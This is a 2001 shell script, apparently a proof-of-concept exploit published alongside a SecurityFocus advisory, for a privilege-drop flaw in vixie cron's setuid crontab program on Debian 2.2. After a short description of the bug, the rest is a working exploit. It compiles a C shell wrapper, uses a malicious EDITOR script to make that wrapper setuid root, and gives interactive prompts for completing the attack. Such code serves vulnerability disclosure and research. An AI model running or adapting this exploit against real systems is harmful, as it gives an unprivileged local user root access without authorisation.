#!/bin/sh
#
# cronboom - simple proof-of-concept exploit for vixie cron version 3.1pl1
#
# synopsis:
#   the crontab file maintenance program (crontab) fails to drop privileges
#   before invoking the editor under certain circumstances.
#
# description:
#   a serialization error exists in some versions of the file maintenance
#   program, crontab.  the vulnerability was introduced in versions which
#   were patched for seperate vulnerability in fall of 2000 (see Bugtraq
#   ID #1960).
#
#   when a parsing error occurs after a modification operation, crontab will
#   fail to drop privileges correctly for subsequent modification operations.
#   because the program is installed setuid root, it may be possible for a
#   local user to gain root privileges.
#
# affected versions:
#   cron_3.0pl1-57.2 distributed with Debian Linux 2.2.
#
#   note that copies of the program with the patch mentioned above are likely
#   to also be vulnerable.
#
# references:
#   http://www.securityfocus.com/bid/2687
#
# 05/07/01 cairnsc@securityfocus.com

CRONTAB=/usr/bin/crontab

if ! test -x $CRONTAB; then
  echo "** unable to locate crontab executable, exiting"
  exit 1
fi

cat > vcsh.c << EOF
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/sh", "sh", NULL);
}
EOF

echo "** compiling shell wrapper as $PWD/vcsh"
cc -o $PWD/vcsh $PWD/vcsh.c

if ! test -x $PWD/vcsh; then
  echo "** compilation failed, exiting"
  exit 1
fi

echo "** creating simple exploit script as $PWD/vcex.sh"
cat > vcex.sh << EOF
#!/bin/sh

sleep 1 && echo "foo" >> \$1

if test -f $PWD/vcboom; then
  chown root.root $PWD/vcsh
  chmod 4755 $PWD/vcsh
  rm $PWD/vcboom
else
  touch $PWD/vcboom
fi
EOF

chmod 0755 $PWD/vcex.sh

echo "** running $CRONTAB -e"
echo "**"
echo "** enter 'yes' at the first prompt, then enter 'no' at the second"
echo

(EDITOR=$PWD/vcex.sh $CRONTAB -e)

echo
echo "** done, the shell wrapper should be suid root"
exit 0
